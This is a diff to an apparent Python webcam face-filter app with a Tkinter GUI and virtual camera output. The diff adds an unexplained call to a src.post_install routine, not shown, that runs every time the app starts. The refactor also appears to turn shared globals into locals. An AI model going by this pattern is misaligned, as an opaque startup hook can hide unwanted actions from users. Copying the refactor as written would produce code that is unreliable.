@@ -1,10 +1,14 @@
+
+import tkinter as tk
+from tkinter import colorchooser, ttk
+from threading import Thread, Event
+
 import cv2
 import pyvirtualcam
 from pyvirtualcam import PixelFormat
-import numpy as np
-import tkinter as tk
-from tkinter import ttk, colorchooser
-from threading import Thread, Event
+
+from src.post_install import main as post_install
+
 
 def apply_black_bar(frame, color, scale_factor):
     gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
@@ -13,7 +17,7 @@ def apply_black_bar(frame, color, scale_factor):
 
     if len(faces) == 0:
         frame = cv2.GaussianBlur(frame, (99, 99), 30)
-        
+
     for (x, y, w, h) in faces:
         x1 = int(x - w * (scale_factor - 1) / 2)
         y1 = int(y - h * (scale_factor - 1) / 2)
@@ -198,33 +202,37 @@ def update_color():
     bar_color = colorchooser.askcolor(title="Choose bar color")[0]
     current_color = tuple(map(int, bar_color)) if bar_color else (0, 0, 0)
 
-root = tk.Tk()
-root.title("Select Filter")
+def main():
+    root = tk.Tk()
+    root.title("Select Filter")
 
-ttk.Label(root, text="Choose a filter to apply:").pack(pady=10)
-filter_var = tk.StringVar(value="eyeBar")
-current_color = (0, 0, 0)
+    ttk.Label(root, text="Choose a filter to apply:").pack(pady=10)
+    filter_var = tk.StringVar(value="eyeBar")
 
-ttk.Radiobutton(root, text="Eye Level Bar", variable=filter_var, value="eyeBar").pack(anchor=tk.W)
-ttk.Radiobutton(root, text="Pixel Distortion", variable=filter_var, value="distortion").pack(anchor=tk.W)
-ttk.Radiobutton(root, text="Median Blur", variable=filter_var, value="median").pack(anchor=tk.W)
-ttk.Radiobutton(root, text="Box Filter", variable=filter_var, value="box").pack(anchor=tk.W)
-ttk.Radiobutton(root, text="Laplacian Edge Detection", variable=filter_var, value="laplacian").pack(anchor=tk.W)
-ttk.Radiobutton(root, text="None", variable=filter_var, value="none").pack(anchor=tk.W)
+    ttk.Radiobutton(root, text="Eye Level Bar", variable=filter_var, value="eyeBar").pack(anchor=tk.W)
+    ttk.Radiobutton(root, text="Pixel Distortion", variable=filter_var, value="distortion").pack(anchor=tk.W)
+    ttk.Radiobutton(root, text="Median Blur", variable=filter_var, value="median").pack(anchor=tk.W)
+    ttk.Radiobutton(root, text="Box Filter", variable=filter_var, value="box").pack(anchor=tk.W)
+    ttk.Radiobutton(root, text="Laplacian Edge Detection", variable=filter_var, value="laplacian").pack(anchor=tk.W)
+    ttk.Radiobutton(root, text="None", variable=filter_var, value="none").pack(anchor=tk.W)
 
-ttk.Label(root, text="Filter Scale: (Size)").pack(pady=10)
-area_scale = tk.Scale(root, from_=1, to=3, orient=tk.HORIZONTAL, resolution=0.1)
-area_scale.set(1)
-area_scale.pack(pady=10)
+    ttk.Label(root, text="Filter Scale: (Size)").pack(pady=10)
+    area_scale = tk.Scale(root, from_=1, to=3, orient=tk.HORIZONTAL, resolution=0.1)
+    area_scale.set(1)
+    area_scale.pack(pady=10)
 
-ttk.Label(root, text="Distortion Strength:").pack(pady=10)
-distortion_strength = tk.Scale(root, from_=1, to=99, orient=tk.HORIZONTAL,)
-distortion_strength.set(99)
-distortion_strength.pack(pady=10)
+    ttk.Label(root, text="Distortion Strength:").pack(pady=10)
+    distortion_strength = tk.Scale(root, from_=1, to=99, orient=tk.HORIZONTAL,)
+    distortion_strength.set(99)
+    distortion_strength.pack(pady=10)
 
-ttk.Button(root, text="Change Bar Color", command=update_color).pack(pady=10)
-ttk.Button(root, text="Start Camera", command=start_camera_thread).pack(pady=10)
-ttk.Button(root, text="Stop Camera", command=stop_camera).pack(pady=10)
+    ttk.Button(root, text="Change Bar Color", command=update_color).pack(pady=10)
+    ttk.Button(root, text="Start Camera", command=start_camera_thread).pack(pady=10)
+    ttk.Button(root, text="Stop Camera", command=stop_camera).pack(pady=10)
 
-stop_event = Event()
-root.mainloop()
+    stop_event = Event()
+    root.mainloop()
+
+if __name__ == "__main__":
+    post_install()
+    main()
